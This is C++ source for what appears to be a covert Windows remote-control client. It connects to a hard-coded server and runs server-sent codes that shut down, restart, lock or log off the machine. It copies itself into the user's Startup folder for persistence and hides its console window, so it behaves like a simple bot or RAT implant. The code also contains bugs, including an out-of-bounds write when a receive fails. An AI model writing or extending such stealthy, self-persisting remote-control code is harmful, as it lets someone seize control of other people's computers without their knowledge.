#include "socket.h"

void Client::CreateSocket() {
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
	    printf("Failed. Error Code: %d\n", WSAGetLastError());
	    return;
	}

	// GetServerIP();

	server_info.sin_family = AF_INET;
	server_info.sin_port = htons(8080);
	server_info.sin_addr.s_addr = inet_addr("192.168.1.16");
	
	client_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (client_socket == INVALID_SOCKET) {
		perror("Socket creation failed");
		WSACleanup();
		return;
	}

	u_long mode = 1; // 1 = non-blocking, 0 = blocking
    if (ioctlsocket(client_socket, FIONBIO, &mode) != 0) {
        std::cerr << "Failed to set non-blocking mode! Error: " << WSAGetLastError() << "\n";
        closesocket(client_socket);
        WSACleanup();
        return;
    }

	Announcement("Socket is up, connecting to the server\n");

	ConnectToServer();
}

void Client::ConnectToServer() {
	while (true) {
		if (client_socket != INVALID_SOCKET) {
			closesocket(client_socket);
	        client_socket = socket(AF_INET, SOCK_STREAM, 0);
		}

		int res = connect(client_socket, (struct sockaddr*)&server_info, sizeof(server_info));
		
		if (res == 0) {
			is_connected = true;

			printf("socket: %i\n", client_socket);

			std::string id = "342";
			if (send(client_socket, id.c_str(), id.length(), 0) == -1) {
				Error("[!] Failed to send id\n");
			}

			break;
		} else {
			Error("Failed to connect. Trying again");
			std::this_thread::sleep_for(std::chrono::seconds(1));
		}
	}

	Announcement("Connected to the server. Receiving commands\n");
	std::thread connection_obj([this]() {
		this->ReceiveCommands();
	});  

	connection_obj.detach();
}

void Client::ReceiveCommands() {
	while (true) {
		char buffer[1024] = {0};

		int received = recv(client_socket, buffer, sizeof(buffer)-1, 0);  // Ensure space for null-termination
		buffer[received] = '\0';

		if (received == 0 || received == SOCKET_ERROR) {
			Error("Disconnected from the server");
			
			while (true) {
				ConnectToServer();
			}

			continue;
		}

		buffer[received] = '\0';

		if (strcmp(buffer, "ping") == 0) {
			send(client_socket, "pong", 4, 0);
		} else {
			CheckCommand(buffer);
		}
	}
}

void Client::CheckCommand(char* cmd) {
	std::string command = std::string(cmd);

	if (command == "229892") {
		Announcement("Server sent a shutdown signal.\n"); // shutdown
		system("shutdown /s /t 5");
		send(client_socket, "ok", 3, 0);
	} else if (command == "893234") {
		Announcement("Server sent a restart signal.\n"); // restart
		system("shutdown /r");	
		send(client_socket, "ok", 3, 0);
	} else if (command == "837453") {
		Announcement("Server sent a lock signal.\n"); // lock
		system("Rundll32.exe user32.dll,LockWorkStation");		
	} else if (command == "126773") {
		Announcement("Server sent a log off signal");
		system("shutdown /l");
	} else {
		Announcement(command);
	}
}

void Client::GetServerIP() {
	printf("[~] Enter the IP address of the server: ");
	std::cin >> server_ip;
}

void Client::Announcement(std::string msg) {
	printf("[+] %s\n", msg.c_str());
}

void Client::Error(std::string msg) {
	printf("[!] %s\n", msg.c_str());
}

void Client::SaveOnStartUp() {
    char currentPath[MAX_PATH];
    if (GetModuleFileName(NULL, currentPath, MAX_PATH) == 0) {
        std::cerr << "Failed to get the executable path." << std::endl;
        return;
    }

    printf("exe path: %s\n", currentPath);

    char destinationPath[MAX_PATH];
    const char* appDataDir = getenv("APPDATA"); // Get the AppData directory
    if (appDataDir == NULL) {
        std::cerr << "Failed to get AppData directory." << std::endl;
        return;
    }

    printf("destination path: %s\n", destinationPath);

    snprintf(destinationPath, MAX_PATH, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.exe", appDataDir);

    if (CopyFile(currentPath, destinationPath, FALSE) == 0) {
        std::cerr << "Failed to copy the file. Error: " << GetLastError() << std::endl;
        return;
    }

    std::cout << "Executable saved to: " << destinationPath << std::endl;
    return ;
}

void Client::Hide() {
	AllocConsole();
	HWND win = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(win, 0);
}